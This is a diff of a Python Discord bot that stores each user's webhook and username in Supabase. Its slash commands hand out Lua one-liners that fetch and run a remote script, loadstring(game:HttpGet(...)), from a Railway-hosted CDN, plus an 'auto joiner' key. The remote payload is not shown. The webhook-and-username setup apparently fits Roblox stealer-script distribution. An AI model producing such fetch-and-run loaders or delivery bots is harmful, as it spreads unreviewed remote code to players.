@@ -3,13 +3,15 @@ import discord
 from discord import app_commands
 from discord.ext import commands
 from supabase import create_client, Client
+import secrets
+import uuid
 
+# ---------------------------
+# CONFIG
+# ---------------------------
 TOKEN = os.getenv("DISCORD_TOKEN")
 SUPABASE_URL = os.getenv("SUPABASE_URL")
 SUPABASE_KEY = os.getenv("SUPABASE_KEY")
-
-# !!! schimbă cu URL-ul Railway unde rulează main.py
-BACKEND_URL = "https://web-production-d7a92.up.railway.app/"
 
 supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
 
@@ -18,10 +20,20 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 tree = bot.tree
 
 
+# ---------------------------
+# HELPERS
+# ---------------------------
+def generate_key():
+    return "ELEMENT$" + secrets.token_urlsafe(24)
+
+
+# ---------------------------
+# ON READY
+# ---------------------------
 @bot.event
 async def on_ready():
     await tree.sync()
-    print(f"✅ Bot conectat ca {bot.user}")
+    print(f"✅ Bot connected as {bot.user}")
 
 
 # ---------------------------
@@ -37,10 +49,7 @@ async def set_webhook(interaction: discord.Interaction, webhook: str):
     else:
         supabase.table("elements").insert({"user_id": user_id, "webhook": webhook}).execute()
 
-    await interaction.response.send_message(
-        f"✅ Webhook set `{webhook}`",
-        ephemeral=True
-    )
+    await interaction.response.send_message(f"✅ Webhook set `{webhook}`", ephemeral=True)
 
 
 # ---------------------------
@@ -56,10 +65,7 @@ async def set_username(interaction: discord.Interaction, username: str):
     else:
         supabase.table("elements").insert({"user_id": user_id, "username": username}).execute()
 
-    await interaction.response.send_message(
-        f"✅ Username set `{username}`",
-        ephemeral=True
-    )
+    await interaction.response.send_message(f"✅ Username set `{username}`", ephemeral=True)
 
 
 # ---------------------------
@@ -68,26 +74,30 @@ async def set_username(interaction: discord.Interaction, username: str):
 @tree.command(name="generate", description="Generate your Element Script")
 async def generate(interaction: discord.Interaction):
     user_id = str(interaction.user.id)
-    existing = supabase.table("elements").select("id").eq("user_id", user_id).execute()
+    existing = supabase.table("elements").select("id, webhook, username").eq("user_id", user_id).execute()
 
     if not existing.data:
         await interaction.response.send_message(
-            "❌ You need to set your webhook and username first with `/setwebhook` and `/setusername`.",
+            "❌ Please set webhook and username first using `/setwebhook` and `/setusername`.",
             ephemeral=True
         )
         return
 
-    element_id = existing.data[0]["id"]
+    element = existing.data[0]
+    element_id = element["id"]
+    webhook = element.get("webhook", "⚠️ Not set")
+    username = element.get("username", "⚠️ Not set")
 
-    msg = (
-        "## Your Element Script\n\n"
-        f"```lua\n"
-        f'ID="{element_id}";\n'
-        f'loadstring(game:HttpGet("{BACKEND_URL}/cdn/element.lua?id={element_id}"))()\n'
-        f"```"
-    )
+    script = f"""## Your Element Script
+Webhook: `{webhook}`
+Username: `{username}`
 
-    await interaction.response.send_message(msg, ephemeral=True)
+```lua
+ID="{element_id}"
+loadstring(game:HttpGet("https://element.up.railway.app/cdn/element.luau"))()
+```"""
+
+    await interaction.response.send_message(script, ephemeral=True)
 
 
 # ---------------------------
@@ -96,26 +106,37 @@ async def generate(interaction: discord.Interaction):
 @tree.command(name="generate-autojoiner", description="Generate your Auto Joiner Script")
 async def generate_autojoiner(interaction: discord.Interaction):
     user_id = str(interaction.user.id)
-    existing = supabase.table("elements").select("id").eq("user_id", user_id).execute()
 
-    if not existing.data:
-        await interaction.response.send_message(
-            "❌ You need to generate Element Script first with `/generate`.",
-            ephemeral=True
-        )
-        return
+    existing = supabase.table("elements").select("id, key").eq("user_id", user_id).execute()
 
-    element_id = existing.data[0]["id"]
+    if existing.data:
+        element = existing.data[0]
+        element_id = element["id"]
+        key = element.get("key")
+    else:
+        element_id = str(uuid.uuid4())
+        key = generate_key()
+        supabase.table("elements").insert({
+            "user_id": user_id,
+            "id": element_id,
+            "key": key
+        }).execute()
 
-    msg = (
-        "## ⚠️ DON'T SHARE! THIS CONTAINS YOUR PRIVATE KEY! ⚠️\n\n"
-        f"```lua\n"
-        f'ID="{element_id}";\n'
-        f'loadstring(game:HttpGet("{BACKEND_URL}/cdn/autojoiner.lua?id={element_id}"))()\n'
-        f"```"
-    )
+    if not key:
+        key = generate_key()
+        supabase.table("elements").update({"key": key}).eq("user_id", user_id).execute()
 
-    await interaction.response.send_message(msg, ephemeral=True)
+    script = f"""## ⚠️ DON'T SHARE! THIS CONTAINS YOUR PRIVATE KEY! ⚠️
+
+```lua
+KEY="{key}"
+loadstring(game:HttpGet("https://element.up.railway.app/cdn/autojoiner.luau"))()
+```"""
+
+    await interaction.response.send_message(script, ephemeral=True)
 
 
+# ---------------------------
+# RUN
+# ---------------------------
 bot.run(TOKEN)
